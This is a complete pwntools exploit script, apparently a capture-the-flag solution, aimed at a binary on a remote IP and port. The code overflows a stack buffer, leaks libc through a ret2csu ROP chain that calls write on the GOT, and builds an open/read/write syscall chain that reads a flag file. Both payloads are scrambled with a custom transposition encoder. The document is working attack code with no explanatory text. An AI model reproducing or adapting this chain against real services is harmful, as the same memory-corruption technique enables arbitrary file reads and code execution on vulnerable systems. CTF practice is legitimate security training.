from pwn import *
import string

libc = ELF('./libc-2.31.so', checksec=False)
elf = context.binary = ELF('./chall', checksec=False)
#p = process(elf.path)
p = remote('103.167.133.102', 17003)
context.terminal = "tmux splitw -h".split(" ")
#gdb.attach(p)

def enc(p):
    p = list(p)
    idx = 0
    cipher = [0 for _ in range(0x400)]
    for i in range(32):
        for j in range(0, 32, 1):
            cipher[idx] = p[j * 32 + i]
            idx += 1
    p = b"".join([(i).to_bytes(1, "big") for i in cipher])
    return p

csu_pop = 0x000000000040167a
csu_mov = 0x0000000000401660
off = 136
fname = b'ini_flagnya_yaaaa.txt'

pay = b'A' * off
# call write
pay += p64(csu_pop)
pay += p64(0) + p64(1) + p64(1) + p64(elf.got["write"]) + p64(8) + p64(elf.got["write"])
pay += p64(csu_mov)
pay += p64(0xdeadbeef) * 7
# call read
pay += p64(csu_pop)
pay += p64(0) + p64(1) + p64(0) + p64(elf.bss(0xa00)) + p64(len(fname)) + p64(elf.got["read"])
pay += p64(csu_mov)
pay += p64(0xdeadbeef) * 7
# back to main & get input
pay += p64(elf.sym["main"])
pay = pay.ljust(0x400, b'\x90')
pay = enc(pay)
p.sendafter(b": ", pay)
p.send(fname)

p.recvuntil(b"Bye!\n")
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leaked - libc.sym["write"]
print("libc_base = ", hex(libc.address))
# ORW TIME (OPEN GETDENTS WRITE) -> (OPEN READ WRITE)
pop_rax = libc.search(asm('pop rax; ret')).__next__()
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rdx_r12 = libc.search(asm('pop rdx; pop r12; ret')).__next__()
syscall = libc.search(asm('syscall; ret')).__next__()
ret = pop_rdi + 1

# call open 
pay = b'\x00' * off
pay += p64(pop_rdi)
pay += p64(elf.bss(0xa00))
pay += p64(pop_rsi)
pay += p64(0)
pay += p64(pop_rdx_r12)
pay += p64(0)
pay += p64(0)
pay += p64(pop_rax)
pay += p64(2)
pay += p64(syscall)
#call getdents
#pay += p64(pop_rdi)
#pay += p64(3)
#pay += p64(pop_rsi)
#pay += p64(elf.bss(0xa00))
#pay += p64(pop_rdx_r12)
#pay += p64(0x100)
#pay += p64(0)
#pay += p64(pop_rax)
#pay += p64(78)
#pay += p64(syscall)

#call read
pay += p64(pop_rdi)
pay += p64(3)
pay += p64(pop_rsi)
pay += p64(elf.bss(0xa00))
pay += p64(pop_rdx_r12)
pay += p64(0x50)
pay += p64(0)
pay += p64(libc.sym["read"])

pay += p64(pop_rdi)
pay += p64(1)
pay += p64(pop_rsi)
pay += p64(elf.bss(0xa00))
pay += p64(pop_rdx_r12)
pay += p64(0x100)
pay += p64(0)
pay += p64(libc.sym["write"])


pay = pay.ljust(0x400, b'\x90')
pay = enc(pay)
p.sendafter(b": ", pay)

p.interactive()
